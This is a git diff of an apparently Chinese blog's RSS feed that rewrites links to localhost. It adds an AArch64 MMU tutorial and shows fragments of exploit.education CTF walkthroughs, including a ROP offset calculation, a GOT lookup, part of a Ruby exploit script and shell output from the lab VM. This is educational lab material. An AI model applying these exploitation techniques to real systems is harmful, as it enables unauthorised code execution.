+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __asm__ &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msr sctlr_el1, %0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;(sctlr) &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __asm__ &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;isb&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分别写入 &lt;code&gt;MAIR_EL1&lt;/code&gt;，&lt;code&gt;TCR_EL1&lt;/code&gt;，&lt;code&gt;TTBR0_EL1&lt;/code&gt; 后，先执行 &lt;code&gt;dsb sy&lt;/code&gt;，等待之前的内存写入（包括页表）全部完成。再执行 &lt;code&gt;isb&lt;/code&gt;，清空流水线，保证后续指令是在这些寄存器配置生效之后才取指执行。最后读出 &lt;code&gt;SCTLR_EL1&lt;/code&gt;，把 M/C/I 置 1 再写回。&lt;/p&gt;
+&lt;p&gt;另外就是需要把函数定义加入头文件，并在 &lt;code&gt;kernel_main()&lt;/code&gt; 中调用它。&lt;/p&gt;
+&lt;h3 id=&#34;测试翻译&#34;&gt;测试翻译&lt;/h3&gt;
+&lt;p&gt;AArch64 提供 &lt;code&gt;AT&lt;/code&gt;（Address Translate）指令，可以手动触发一次翻译，结果写进 &lt;code&gt;PAR_EL1&lt;/code&gt;。这样能让硬件明确反应某个地址翻译到了哪里。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__asm__ &lt;span style=&#34;color:#a6e22e&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;at s1e1r, %0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;(va));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__asm__ &lt;span style=&#34;color:#a6e22e&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;isb&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__asm__ &lt;span style=&#34;color:#a6e22e&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mrs %0, par_el1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=r&amp;#34;&lt;/span&gt;(par));
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;s1e1r&lt;/code&gt; 的意思是：Stage 1，EL1，Read。执行后结果写入 &lt;code&gt;PAR_EL1&lt;/code&gt;。由于翻译结果是否成功会导致 &lt;code&gt;PAR_EL1&lt;/code&gt; 的格式不同，这里只介绍成功的情况：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;[63:56] 内存属性，编码和 MAIR 的 Attr 一样&lt;/li&gt;
+&lt;li&gt;[47:12] PA：翻译结果的物理地址&lt;/li&gt;
+&lt;li&gt;[8:7]	SH：共享域，编码和描述符里的 SH 一样&lt;/li&gt;
+&lt;li&gt;[0] F：Fault，翻译是否失败。&lt;code&gt;0&lt;/code&gt; 成功，&lt;code&gt;1&lt;/code&gt; 失败&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;输出&#34;&gt;输出&lt;/h4&gt;
+&lt;p&gt;分别翻译三个地址：UART（设备区），内核入口（RAM 区），以及 &lt;code&gt;0x8000_0000&lt;/code&gt;（完全没映射），得到结果如下：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Current EL: 1
+l1_table addr = 0x0000000040103000
+l1_table[0] = 0x0060000000000405
+l1_table[1] = 0x0040000040000401
+VA = 0x0000000009000000 translation succeeded, PA = 0x0000000009000000, PAR = 0x0000000009000b00
+VA = 0x0000000040100000 translation succeeded, PA = 0x0000000040100000, PAR = 0xff00000040100a00
+VA = 0x0000000080000000 translation failed, PAR = 0x000000000000080b
+Platform timer frequency: 62500000
+UART and Timer IRQ ready
+tick: 100
+tick: 200
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;第四步搞破坏&#34;&gt;第四步：搞破坏&lt;/h2&gt;
+&lt;p&gt;现在尝试读一块没映射的地址：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;uart_print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Reading 0x80000000, l1_table[2] is invalid&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt; bad &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80000000UL&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;uart_print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;read back: &amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;uart_print_hex&lt;/span&gt;(bad);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;uart_print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;输出-1&#34;&gt;输出&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;...
+Platform timer frequency: 62500000
+UART and Timer IRQ ready
+Reading 0x80000000, where l1_table[2] is invalid
+=== Caught EL1 exception ===
+kind: 0
+ESR:  0x0000000096000005
+EC:   0x0000000000000025
+ELR:  0x00000000401012b4
+SPSR: 0x0000000080000345
+FAR:  0x0000000080000000
+Unhandled EL1 exception
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功触发了异常。kind 为 0 是项目之前在 &lt;code&gt;exception.c&lt;/code&gt; 里定义的同步异常。这里的 EC 是 Exception Class，位于 &lt;code&gt;ESR_EL1[31:26]&lt;/code&gt;：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;EC&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0x20&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Instruction Abort（取指失败，来自较低 EL）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0x21&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Instruction Abort（取指失败，来自同一 EL）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0x24&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Data Abort，来自低 EL（用户程序）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0x25&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Data Abort，来自同一 EL（当前情况）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0x3C&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;BRK 断点&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;在 EC 为 &lt;code&gt;0x25&lt;/code&gt; 时，Instruction Specific Syndrome（ISS）位于 &lt;code&gt;ESR_EL1[24:0]&lt;/code&gt;，其中 Data Fault Status Code（DFSC）位于 &lt;code&gt;ESR_EL1.ISS[5:0]&lt;/code&gt;：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;DFSC&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;th&gt;原因&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0b000100&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Translation fault, level 0&lt;/td&gt;
+&lt;td&gt;48 位 VA 下根表无效&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0b000101&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Translation fault, level 1&lt;/td&gt;
+&lt;td&gt;L1 描述符为 0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0b000111&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Translation fault, level 3&lt;/td&gt;
+&lt;td&gt;L3 页描述符无效&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0b001001&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Access flag fault, level 1&lt;/td&gt;
+&lt;td&gt;AF 忘了置 1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0b001111&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Permission fault, level 3&lt;/td&gt;
+&lt;td&gt;AP 设错&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;即，异常来源于相同 EL 的数据访问，原因是 L1 描述符无效。也就是我们之前写的 &lt;code&gt;l1_table[2] = 0&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;另外两个寄存器：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ELR_EL1&lt;/code&gt;：出错的那条指令的地址。用 &lt;code&gt;llvm-objdump -d kernel.elf&lt;/code&gt; 能看到它就是那条 &lt;code&gt;ldr&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;FAR_EL1&lt;/code&gt;：出错的虚拟地址，也就是之前代码中的 &lt;code&gt;0x8000_0000&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;结尾语&#34;&gt;结尾语&lt;/h2&gt;
+&lt;p&gt;选手搓 OS 做 Final Year Project 完全是小时候听 Linus 励志故事听多了。等做到现在发现光是 MMU 都这么复杂的时候想换方向已经来不及了。&lt;/p&gt;
+&lt;h2 id=&#34;参考资料&#34;&gt;参考资料&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://documentation-service.arm.com/static/5efa1d23dbdee951c1ccdec5&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Armv8-A Address Translation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://documentation-service.arm.com/static/5e906b9fc8052b1608760b6b&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Cortex-A57 MPCore Processor Technical Reference Manual&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/lumos&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Lumos&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
         <title>Fusion Level 03 Walkthrough</title>
-        <link>/p/fusion_level_03/</link>
+        <link>//localhost:1313/p/fusion_level_03/</link>
         <pubDate>Mon, 30 May 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/fusion_level_03/</guid>
-        <description>&lt;img src="/p/fusion_level_03/cover.png" alt="Featured image of post Fusion Level 03 Walkthrough" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mzh.moegirl.org.cn/zh-hans/%e8%bf%99%e6%98%af%e6%88%91%e6%9c%80%e5%90%8e%e7%9a%84%e6%b3%a2%e7%ba%b9&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <guid>//localhost:1313/p/fusion_level_03/</guid>
+        <description>&lt;img src="//localhost:1313/p/fusion_level_03/cover.png" alt="Featured image of post Fusion Level 03 Walkthrough" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mzh.moegirl.org.cn/zh-hans/%e8%bf%99%e6%98%af%e6%88%91%e6%9c%80%e5%90%8e%e7%9a%84%e6%b3%a2%e7%ba%b9&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ 这是我最后的波纹&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;总之要返校了，之后大概没太多时间玩这些了&amp;hellip;&lt;/p&gt;
 &lt;p&gt;一开始我看着这题，感觉也就是源码有点长吧&lt;/p&gt;
@@ -1478,7 +2442,7 @@ data, etc to &lt;a class=&#34;link&#34; href=&#34;mailto:dl@cs.oswego.edu&#34; &
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(gdb) p strncmp
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;text gnu&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;indirect&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;function variable, no debug info&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;} &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb75a0530&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;strncmp&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那么偏移量是：&lt;code&gt;0xb7566b20 &amp;lt;__libc_system&amp;gt; - 0xb75a0530 &amp;lt;strncmp&amp;gt;&lt;/code&gt; = &lt;code&gt;0xFFFC65F0&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;直接套 &lt;a class=&#34;link&#34; href=&#34;/p/fusion_level_03/#find-out-rop-chain&#34; &gt;Find Out ROP chain&lt;/a&gt; 节最后的 ROP Chain：&lt;/p&gt;
+&lt;p&gt;直接套 &lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/fusion_level_03/#find-out-rop-chain&#34; &gt;Find Out ROP chain&lt;/a&gt; 节最后的 ROP Chain：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# GOT&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fusion@fusion&lt;span style=&#34;color:#e6db74&#34;&gt;:~&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; objdump &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;R &lt;span style=&#34;color:#e6db74&#34;&gt;/opt/&lt;/span&gt;fusion&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;level03 &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; grep strncmp
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0804&lt;/span&gt;bda0 &lt;span style=&#34;color:#66d9ef&#34;&gt;R_386_JUMP_SLOT&lt;/span&gt;   strncmp
@@ -1716,10 +2680,10 @@ data, etc to &lt;a class=&#34;link&#34; href=&#34;mailto:dl@cs.oswego.edu&#34; &
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Linux&lt;/span&gt; fusion &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;generic&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;pae &lt;span style=&#34;color:#75715e&#34;&gt;#22-Ubuntu SMP Wed Nov 2 15:17:35 UTC 2011 i686 i686 i386 GNU/Linux&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exit
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;心情激动，但是说不出话&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/fusion_level_03/end.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/fusion_level_03/end.png&#34;
 	width=&#34;3584&#34;
 	height=&#34;2010&#34;
-	srcset=&#34;/p/fusion_level_03/end_hufc920d724fc1479f036e7e137d9ce8da_1084356_480x0_resize_box_3.png 480w, /p/fusion_level_03/end_hufc920d724fc1479f036e7e137d9ce8da_1084356_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/fusion_level_03/end_hufc920d724fc1479f036e7e137d9ce8da_1084356_480x0_resize_box_3.png 480w, //localhost:1313/p/fusion_level_03/end_hufc920d724fc1479f036e7e137d9ce8da_1084356_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;end.png&#34;
@@ -1871,10 +2835,10 @@ data, etc to &lt;a class=&#34;link&#34; href=&#34;mailto:dl@cs.oswego.edu&#34; &
 加了英文注释本来是想上传 GitHub 的
 &lt;p&gt;但是姑且还是把 Fusion 的题目全做完了再一起传吧&lt;/p&gt;
 &lt;p&gt;以及草稿&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/fusion_level_03/trial_and_error.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/fusion_level_03/trial_and_error.png&#34;
 	width=&#34;1234&#34;
 	height=&#34;2146&#34;
-	srcset=&#34;/p/fusion_level_03/trial_and_error_hud12e431804f6bbaf5289751d0b70e8e8_824895_480x0_resize_box_3.png 480w, /p/fusion_level_03/trial_and_error_hud12e431804f6bbaf5289751d0b70e8e8_824895_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/fusion_level_03/trial_and_error_hud12e431804f6bbaf5289751d0b70e8e8_824895_480x0_resize_box_3.png 480w, //localhost:1313/p/fusion_level_03/trial_and_error_hud12e431804f6bbaf5289751d0b70e8e8_824895_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;trial_and_error.png&#34;
@@ -1898,10 +2862,10 @@ data, etc to &lt;a class=&#34;link&#34; href=&#34;mailto:dl@cs.oswego.edu&#34; &
 &lt;p&gt;姑且把开了几个月的 Terminal 和 Safari 标签页都关掉了&amp;hellip;&lt;/p&gt;
 &lt;p&gt;再打开来的话大概是七月了呢&amp;hellip;&lt;/p&gt;
 &lt;p&gt;啊总之笔记本没电了，先爬爬x&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/fusion_level_03/battery.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/fusion_level_03/battery.png&#34;
 	width=&#34;1046&#34;
 	height=&#34;454&#34;
-	srcset=&#34;/p/fusion_level_03/battery_hu5cf1e39aab24deea0face06f2a5ad4d3_171328_480x0_resize_box_3.png 480w, /p/fusion_level_03/battery_hu5cf1e39aab24deea0face06f2a5ad4d3_171328_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/fusion_level_03/battery_hu5cf1e39aab24deea0face06f2a5ad4d3_171328_480x0_resize_box_3.png 480w, //localhost:1313/p/fusion_level_03/battery_hu5cf1e39aab24deea0face06f2a5ad4d3_171328_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;battery.png&#34;
@@ -1937,11 +2901,11 @@ data, etc to &lt;a class=&#34;link&#34; href=&#34;mailto:dl@cs.oswego.edu&#34; &
         </item>
         <item>
         <title>Fusion Level 01 Walkthrough</title>
-        <link>/p/fusion_level_01/</link>
+        <link>//localhost:1313/p/fusion_level_01/</link>
         <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/fusion_level_01/</guid>
-        <description>&lt;img src="/p/fusion_level_01/cover.png" alt="Featured image of post Fusion Level 01 Walkthrough" /&gt;&lt;h2 id=&#34;level-01&#34;&gt;Level 01&lt;/h2&gt;
+        <guid>//localhost:1313/p/fusion_level_01/</guid>
+        <description>&lt;img src="//localhost:1313/p/fusion_level_01/cover.png" alt="Featured image of post Fusion Level 01 Walkthrough" /&gt;&lt;h2 id=&#34;level-01&#34;&gt;Level 01&lt;/h2&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://exploit.education/fusion/level01/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ https://exploit.education/fusion/level01/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;About&lt;/strong&gt;&lt;/p&gt;
@@ -2387,10 +3351,10 @@ realpath - return the canonicalized absolute pathname&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system command
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/fusion_level_01/host.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/fusion_level_01/host.png&#34;
 	width=&#34;2878&#34;
 	height=&#34;1308&#34;
-	srcset=&#34;/p/fusion_level_01/host_hubc4b35373027b1e3b03da90da0035f48_1454588_480x0_resize_box_3.png 480w, /p/fusion_level_01/host_hubc4b35373027b1e3b03da90da0035f48_1454588_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/fusion_level_01/host_hubc4b35373027b1e3b03da90da0035f48_1454588_480x0_resize_box_3.png 480w, //localhost:1313/p/fusion_level_01/host_hubc4b35373027b1e3b03da90da0035f48_1454588_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;host.png&#34;
@@ -2401,10 +3365,10 @@ realpath - return the canonicalized absolute pathname&lt;/p&gt;
 		data-flex-basis=&#34;528px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/fusion_level_01/virtual.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/fusion_level_01/virtual.png&#34;
 	width=&#34;2878&#34;
 	height=&#34;1100&#34;
-	srcset=&#34;/p/fusion_level_01/virtual_hu3fa5dd3ba2c818abfe88d779311f5bc8_1291915_480x0_resize_box_3.png 480w, /p/fusion_level_01/virtual_hu3fa5dd3ba2c818abfe88d779311f5bc8_1291915_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/fusion_level_01/virtual_hu3fa5dd3ba2c818abfe88d779311f5bc8_1291915_480x0_resize_box_3.png 480w, //localhost:1313/p/fusion_level_01/virtual_hu3fa5dd3ba2c818abfe88d779311f5bc8_1291915_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;virtual.png&#34;
@@ -2419,11 +3383,11 @@ realpath - return the canonicalized absolute pathname&lt;/p&gt;
         </item>
         <item>
         <title>Protostar Final 2 Walkthrough</title>
-        <link>/p/protostar_final_2/</link>
+        <link>//localhost:1313/p/protostar_final_2/</link>
         <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/protostar_final_2/</guid>
-        <description>&lt;img src="/p/protostar_final_2/cover.png" alt="Featured image of post Protostar Final 2 Walkthrough" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <guid>//localhost:1313/p/protostar_final_2/</guid>
+        <description>&lt;img src="//localhost:1313/p/protostar_final_2/cover.png" alt="Featured image of post Protostar Final 2 Walkthrough" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ 最终的 Ruby 脚本放在了这里&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;至此 Protostar 全部做完了呢&amp;hellip;&lt;/p&gt;
 &lt;hr&gt;
@@ -2620,7 +3584,7 @@ realpath - return the canonicalized absolute pathname&lt;/p&gt;
 &lt;p&gt;然后再利用 &lt;code&gt;int get_requests(int fd)&lt;/code&gt; 的 &lt;code&gt;free(destroylist[i])&lt;/code&gt;！&lt;/p&gt;
 &lt;p&gt;这就是那个 &lt;code&gt;unlink()&lt;/code&gt; 的 trick 了，&lt;/p&gt;
 &lt;br&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;关于 dlmalloc 的 unlink trick，全部已经移动到了这里：&lt;a class=&#34;link&#34; href=&#34;/p/old_dlmalloc_unlink_tricks&#34; &gt;Old Dlmalloc Unlink Tricks&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
